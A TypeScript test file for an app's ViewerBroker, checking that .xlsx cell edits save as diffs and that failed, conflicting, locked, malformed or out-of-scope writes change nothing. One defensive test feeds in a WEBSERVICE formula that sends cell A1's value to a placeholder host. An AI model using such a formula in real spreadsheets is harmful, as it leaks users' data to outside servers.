/**
 * TODO 1212 stage 1: saving the cell values of `.xlsx` in `ViewerBroker`. For a viewer that declares `viewer.cellEdits` in its manifest (resolution `cellEdits: true`),
 * `write`'s `content` is the list of edits, and it is written to the original file as a diff. The choke point, the mtime conflict, and the audit are the same as for text saves.
 * A refusal, or a malformed draft, writes nothing. The tree is under home (the pitfall of phase 1).
 */
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest'
import { readFileSync, statSync, writeFileSync } from 'node:fs'
import { homedir } from 'node:os'
import { join } from 'node:path'
import Database from 'better-sqlite3-multiple-ciphers'
import type { Database as Db } from 'better-sqlite3-multiple-ciphers'
import { runMigrations } from '../src/common/migrations.js'
import { AuditLog } from '../src/main/capability/audit.js'
import { CredentialStore } from '../src/main/capability/credentials.js'
import { CapabilityBroker, type PluginPolicy } from '../src/main/capability/broker.js'
import { ViewerBroker } from '../src/main/capability/viewer.js'
import type { CapabilityName, ResolvedViewer } from '../src/shared/plugin.js'
import { pathToUri } from '../src/common/uri.js'
import { serializeCellEdits } from '../src/shared/xlsx-cells.js'
import { readEntry, readZip } from '../src/main/capability/zip-rewrite.js'
import { makeTestDir, removeTestDir, testExclusions } from './helpers/tmp.js'
import { makeXlsx } from './helpers/xlsx.js'

vi.mock('electron', () => ({ utilityProcess: { fork: () => null } }))
// Wraps writeSync to create a partial write failure (the default stays the real one).
const failing = vi.hoisted(() => ({ nth: 0, calls: 0 }))
vi.mock('node:fs', async (orig) => {
  const actual = await orig<typeof import('node:fs')>()
  return {
    ...actual,
    writeSync: ((...args: Parameters<typeof actual.writeSync>) => {
      failing.calls += 1
      if (failing.nth > 0 && failing.calls === failing.nth) {
        // Writes half and then ENOSPC.
        const [fd, buf, off, len, pos] = args as unknown as [number, Buffer, number, number, number]
        actual.writeSync(fd, buf, off, Math.max(1, len >> 1), pos)
        throw Object.assign(new Error('ENOSPC'), { code: 'ENOSPC' })
      }
      return (actual.writeSync as (...a: unknown[]) => number)(...args)
    }) as typeof actual.writeSync
  }
})

const OFFICE = 'test.office'
const TEXT = 'test.text'
const rules = testExclusions(homedir())
const SHEET = 'xl/worksheets/sheet1.xml'

let root: string
let dbDir: string
let db: Db
let audit: AuditLog
let viewer: ViewerBroker
let file: string
let uri: string

function policy(id: string): PluginPolicy {
  return {
    id,
    declared: { credentials: [], networkHosts: [], fsRead: [root], fsWrite: [], indexSources: [], ui: false },
    consented: new Set<CapabilityName>(['fs'])
  }
}

function resolveViewer(target: string): ResolvedViewer | null {
  if (target.endsWith('.xlsx')) {
    return { pluginId: OFFICE, name: 'office', url: 'aios-plugin://test.office/v.html', editable: false, delivery: 'url', cellEdits: true }
  }
  return { pluginId: TEXT, name: 'txt', url: 'aios-plugin://test.text/v.html', editable: true, delivery: 'text' }
}

function writeBook(): void {
  writeFileSync(
    file,
    makeXlsx({
      sheets: [{ name: 'S', body: '<sheetData><row r="1"><c r="A1"><v>1</v></c><c r="B1"><f>A1*2</f><v>2</v></c></row></sheetData><mergeCells count="1"><mergeCell ref="C1:D1"/></mergeCells>' }]
    })
  )
}

async function sheetXml(): Promise<string> {
  const zip = readZip(readFileSync(file))
  const entry = zip.entries.find((e) => e.name === SHEET)
  if (entry === undefined) throw new Error('sheet')
  return (await readEntry(zip, entry, 1 << 20)).toString('utf8')
}

beforeAll(() => {
  root = makeTestDir('xlsx-cells-broker')
  dbDir = makeTestDir('xlsx-cells-broker-db')
  file = join(root, 'book.xlsx')
  uri = pathToUri(file)
  db = new Database(join(dbDir, 'aios.db'))
  db.pragma(`key = '${'f'.repeat(64)}'`)
  runMigrations(db)
  audit = new AuditLog(db)
  const broker = new CapabilityBroker({
    scope: { rules },
    audit,
    credentials: new CredentialStore(dbDir, { available: () => false, seal: () => Buffer.alloc(0), open: () => '' }),
    policyOf: (id) => (id === OFFICE || id === TEXT ? policy(id) : null),
    index: { put: async () => undefined, remove: async () => undefined },
    notify: () => undefined
  })
  viewer = new ViewerBroker({ broker, audit, scope: { rules }, resolveViewer })
})

afterAll(() => {
  audit.dispose()
  db.close()
  removeTestDir(root)
  removeTestDir(dbDir)
})

describe('ViewerBroker の .xlsx のセルの値の保存', () => {
  it('読みは URL + cellEdits、書きは差分で当たる', async () => {
    writeBook()
    expect(viewer.open(uri)?.pluginId).toBe(OFFICE)
    const resource = await viewer.read(OFFICE, uri)
    expect(resource.kind).toBe('binary')
    if (resource.kind !== 'binary') return
    expect(resource.cellEdits).toBe(true)
    const draft = serializeCellEdits([{ sheet: SHEET, ref: 'A1', value: { t: 'n', v: 5 } }])
    const result = await viewer.write(OFFICE, uri, draft, resource.mtimeMs)
    expect(result).toMatchObject({ ok: true, reason: null })
    expect(result.size).toBe(statSync(file).size)
    expect(await sheetXml()).toContain('<c r="A1"><v>5</v></c><c r="B1"><f>A1*2</f><v>2</v></c>')
    viewer.close(OFFICE, uri)
  })

  it('書き込みの途中で失敗しても元のバイト列に戻す', async () => {
    writeBook()
    viewer.open(uri)
    const before = readFileSync(file)
    const mtime = statSync(file).mtimeMs
    const draft = serializeCellEdits([{ sheet: SHEET, ref: 'A1', value: { t: 'n', v: 7 } }])
    failing.calls = 0
    failing.nth = 1
    try {
      const result = await viewer.write(OFFICE, uri, draft, mtime)
      expect(result).toMatchObject({ ok: false, reason: 'io' })
    } finally {
      failing.nth = 0
    }
    expect(Buffer.compare(readFileSync(file), before)).toBe(0)
    viewer.close(OFFICE, uri)
  })

  it('mtime が違えば conflict で書かない', async () => {
    writeBook()
    viewer.open(uri)
    const before = readFileSync(file)
    const draft = serializeCellEdits([{ sheet: SHEET, ref: 'A1', value: { t: 'n', v: 9 } }])
    const result = await viewer.write(OFFICE, uri, draft, 1)
    expect(result).toMatchObject({ ok: false, reason: 'conflict' })
    expect(Buffer.compare(readFileSync(file), before)).toBe(0)
    viewer.close(OFFICE, uri)
  })

  it('結合の内側は locked、形のおかしい下書きは unsupported で、どちらも書かない', async () => {
    writeBook()
    viewer.open(uri)
    const before = readFileSync(file)
    const mtime = statSync(file).mtimeMs
    const locked = await viewer.write(OFFICE, uri, serializeCellEdits([{ sheet: SHEET, ref: 'D1', value: { t: 'n', v: 1 } }]), mtime)
    expect(locked).toMatchObject({ ok: false, reason: 'locked' })
    const garbage = await viewer.write(OFFICE, uri, 'PK\u0003\u0004 raw bytes', mtime)
    expect(garbage).toMatchObject({ ok: false, reason: 'unsupported' })
    // Even if the viewer (outside the trust boundary) puts a function that communicates outside into the draft, it is not written (the security review of TODO 1212 stage 2).
    const outbound = JSON.stringify({
      format: 'aios.xlsx-cells/1',
      edits: [{ sheet: SHEET, ref: 'C1', value: { t: 'f', v: '_xlfn.WEBSERVICE("https://x.example/?"&A1)' } }]
    })
    expect(await viewer.write(OFFICE, uri, outbound, mtime)).toMatchObject({ ok: false, reason: 'unsupported' })
    expect(Buffer.compare(readFileSync(file), before)).toBe(0)
    viewer.close(OFFICE, uri)
  })

  it('宣言の範囲の外で開いていないファイルは denied で書かない', async () => {
    const other = makeTestDir('xlsx-cells-broker-other')
    try {
      const outside = join(other, 'book.xlsx')
      writeFileSync(outside, makeXlsx({ sheets: [{ name: 'S', body: '<sheetData/>' }] }))
      const before = readFileSync(outside)
      const draft = serializeCellEdits([{ sheet: SHEET, ref: 'A1', value: { t: 'n', v: 5 } }])
      expect(await viewer.write(OFFICE, pathToUri(outside), draft, null)).toMatchObject({ ok: false, reason: 'denied' })
      expect(Buffer.compare(readFileSync(outside), before)).toBe(0)
    } finally {
      removeTestDir(other)
    }
  })
})
